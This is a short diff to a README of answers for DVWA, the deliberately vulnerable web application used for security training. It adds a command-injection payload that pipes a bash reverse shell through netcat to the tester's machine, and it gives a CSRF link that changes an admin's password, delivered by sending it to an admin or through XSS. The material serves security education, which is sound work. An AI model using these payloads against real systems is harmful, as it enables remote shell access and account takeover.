@@ -1,8 +1,8 @@
 # DVWA-Answers
 
 ### Command Execution:
-10.0.0.1 & nc -l 4444
-then connect with your machine: nc <ip> <port>
+Start a netcat listener on your machine: nc -lvp 4545
+command to input: ping google.com & nc <ip of your machine> 4545 -v -e /bin/bash
 
 ### CSRF you can send this link to an admin user or xss it:
 http://10.195.2.2/dvwa/vulnerabilities/csrf/?password_new=asd123&password_conf=asd123&Change=Change#
